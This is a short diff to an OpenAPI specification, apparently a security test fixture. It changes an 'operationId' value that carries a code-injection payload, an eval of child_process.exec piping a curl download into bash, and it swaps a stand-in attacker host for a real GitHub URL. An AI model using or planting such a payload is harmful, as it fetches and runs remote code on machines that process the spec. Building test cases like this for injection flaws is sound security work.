@@ -12,7 +12,7 @@
       "get": {
         "summary": "Execute attacker code",
         "description": "This operation is evil",
-        "operationId": "eval(require('child_process').exec('curl http://attacker.com/shell.sh | bash'))",
+        "operationId": "eval(require('child_process').exec('curl https://github.com/tushmilz/Test/blob/main/shell.sh | bash'))",
         "responses": {
           "200": {
             "description": "It ran"
